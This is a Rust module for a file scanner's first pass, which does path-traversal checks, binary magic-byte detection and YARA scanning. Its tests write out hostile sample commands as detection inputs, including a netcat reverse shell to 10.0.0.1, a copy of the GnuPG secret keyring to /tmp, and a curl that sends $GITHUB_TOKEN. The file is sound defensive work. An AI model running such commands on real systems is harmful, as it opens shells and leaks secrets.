//! Pass 1: fast in-process analysis — magic bytes, YARA, path re-check.

use std::path::{Component, Path};

use yara_x::Compiler;

use super::{Finding, Severity, StaticAnalysisError};

/// Compiled YARA rules. Built once at worker startup.
pub struct CompiledRules(yara_x::Rules);

/// Compile all `.yar` files under `rules_dir` into a [`CompiledRules`] instance.
///
/// # Errors
///
/// Returns `StaticAnalysisError::YaraCompilation` if any rule file fails to compile.
pub fn compile_rules(rules_dir: &Path) -> Result<CompiledRules, StaticAnalysisError> {
    let mut compiler = Compiler::new();

    for entry in walkdir::WalkDir::new(rules_dir)
        .follow_links(false)
        .into_iter()
        .filter_map(std::result::Result::ok)
    {
        if entry.path().extension().and_then(|e| e.to_str()) != Some("yar") {
            continue;
        }
        let source = std::fs::read_to_string(entry.path()).map_err(StaticAnalysisError::Io)?;
        compiler
            .add_source(source.as_str())
            .map_err(|e| StaticAnalysisError::YaraCompilation(e.to_string()))?;
    }

    let rules = compiler.build();
    Ok(CompiledRules(rules))
}

/// Run Pass 1 on a single file.
///
/// Checks:
/// 1. Magic byte detection (ELF, Mach-O, PE) via `infer`.
/// 2. YARA scan against compiled rules.
/// 3. Path component safety re-check.
///
/// Returns findings (empty = clean). Does not scan directories.
///
/// # Errors
///
/// Returns `Err` on I/O failure.
pub fn run_pass1(
    file: &Path,
    rel: &Path,
    rules: &CompiledRules,
) -> Result<Vec<Finding>, StaticAnalysisError> {
    let mut findings = Vec::new();

    // Path re-check (defence-in-depth)
    for component in rel.components() {
        match component {
            Component::ParentDir | Component::RootDir | Component::Prefix(_) => {
                findings.push(Finding {
                    file: rel.display().to_string(),
                    tool: "pass1".into(),
                    rule_id: "path_traversal".into(),
                    severity: Severity::Error,
                    message: "path traversal component detected".into(),
                });
                return Ok(findings); // fail-fast
            }
            _ => {}
        }
    }

    let bytes = std::fs::read(file).map_err(StaticAnalysisError::Io)?;

    // Magic byte detection
    if let Some(kind) = infer::get(&bytes) {
        let mime = kind.mime_type();
        let is_binary = matches!(
            mime,
            "application/x-executable"  // ELF
                | "application/x-mach-binary" // Mach-O
                | "application/x-msdownload"  // PE
                | "application/x-dosexec" // PE alternate
        );
        if is_binary {
            findings.push(Finding {
                file: rel.display().to_string(),
                tool: "magic_bytes".into(),
                rule_id: format!("binary_disguised_{}", kind.extension()),
                severity: Severity::Error,
                message: format!("file matches binary magic bytes ({mime})"),
            });
            return Ok(findings); // fail-fast
        }
    }

    // YARA scan
    let mut scanner = yara_x::Scanner::new(&rules.0);
    let results = scanner
        .scan(&bytes)
        .map_err(|e| StaticAnalysisError::ToolError {
            tool: "yara".into(),
            reason: e.to_string(),
        })?;

    for rule in results.matching_rules() {
        findings.push(Finding {
            file: rel.display().to_string(),
            tool: "yara".into(),
            rule_id: rule.identifier().to_owned(),
            severity: Severity::Error,
            message: format!("YARA rule matched: {}", rule.identifier()),
        });
    }

    Ok(findings)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn rules_dir() -> std::path::PathBuf {
        // Locate rules dir relative to this source file at compile time.
        let manifest = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
        manifest.join("rules")
    }

    fn compiled() -> CompiledRules {
        compile_rules(&rules_dir()).expect("rules should compile")
    }

    #[test]
    fn clean_script_produces_no_findings() {
        let rules = compiled();
        let fixture =
            std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/clean_script.py");
        let findings = run_pass1(
            &fixture,
            std::path::Path::new("scripts/clean_script.py"),
            &rules,
        )
        .unwrap();
        assert!(
            findings.is_empty(),
            "clean script should produce no findings: {findings:?}"
        );
    }

    #[test]
    fn reverse_shell_fixture_triggers_yara() {
        let rules = compiled();
        let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/bad_reverse_shell.py");
        let findings = run_pass1(&fixture, Path::new("scripts/bad.py"), &rules).unwrap();
        assert!(!findings.is_empty(), "reverse shell should trigger YARA");
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "finding should be from yara"
        );
    }

    #[test]
    fn curl_bash_fixture_triggers_yara() {
        let rules = compiled();
        let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/bad_curl_bash.sh");
        let findings = run_pass1(&fixture, Path::new("scripts/bad.sh"), &rules).unwrap();
        assert!(!findings.is_empty(), "curl|bash should trigger YARA");
    }

    #[test]
    fn aws_creds_fixture_triggers_yara() {
        let rules = compiled();
        let fixture = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .join("tests/fixtures/bad_aws_creds.py");
        let findings = run_pass1(&fixture, Path::new("scripts/bad.py"), &rules).unwrap();
        assert!(
            !findings.is_empty(),
            "AWS credential access should trigger YARA"
        );
    }

    #[test]
    fn elf_magic_bytes_trigger_binary_detection() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        // ELF magic: 0x7f 'E' 'L' 'F'
        let mut elf_bytes = vec![0x7f, b'E', b'L', b'F', 0x02, 0x01, 0x01, 0x00];
        elf_bytes.extend_from_slice(&[0u8; 56]); // minimal ELF header padding
        let file = dir.path().join("evil.py");
        fs::write(&file, &elf_bytes).unwrap();
        let findings = run_pass1(&file, Path::new("scripts/evil.py"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "magic_bytes"),
            "ELF magic bytes should be detected: {findings:?}"
        );
    }

    #[test]
    fn rules_compile_without_error() {
        // Smoke test: all rule files compile successfully.
        compile_rules(&rules_dir()).expect("YARA rules should compile without errors");
    }

    #[test]
    fn sensitive_path_gnupg_triggers_yara() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        let file = dir.path().join("exfil.sh");
        fs::write(&file, b"cp ~/.gnupg/secring.gpg /tmp/leak").unwrap();
        let findings = run_pass1(&file, Path::new("scripts/exfil.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "~/.gnupg should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn sensitive_env_var_github_token_triggers_yara() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        let file = dir.path().join("leak.sh");
        fs::write(
            &file,
            b"curl -H \"Authorization: $GITHUB_TOKEN\" https://api.github.com",
        )
        .unwrap();
        let findings = run_pass1(&file, Path::new("scripts/leak.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "$GITHUB_TOKEN should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn network_tool_exfil_triggers_yara() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        let file = dir.path().join("exfil.sh");
        fs::write(&file, b"nc -e /bin/bash 10.0.0.1 4444").unwrap();
        let findings = run_pass1(&file, Path::new("scripts/exfil.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "nc -e should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn privilege_escalation_setuid_triggers_yara() {
        let rules = compiled();
        let fixture =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/bad_privileged.sh");
        let findings = run_pass1(&fixture, Path::new("scripts/bad_privileged.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "chmod +s should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn privilege_escalation_sudo_triggers_yara() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        let file = dir.path().join("setup.sh");
        fs::write(&file, b"sudo rm -rf /var/cache/apt").unwrap();
        let findings = run_pass1(&file, Path::new("scripts/setup.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "sudo should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn inline_interpreter_perl_triggers_yara() {
        let rules = compiled();
        let dir = tempdir().unwrap();
        let file = dir.path().join("run.sh");
        fs::write(&file, b"perl -e 'print \"hello\"'").unwrap();
        let findings = run_pass1(&file, Path::new("scripts/run.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "perl -e should trigger YARA: {findings:?}"
        );
    }

    #[test]
    fn destructive_ops_triggers_yara() {
        let rules = compiled();
        let fixture =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/bad_destructive.sh");
        let findings =
            run_pass1(&fixture, Path::new("scripts/bad_destructive.sh"), &rules).unwrap();
        assert!(
            findings.iter().any(|f| f.tool == "yara"),
            "rm -rf should trigger YARA: {findings:?}"
        );
    }
}
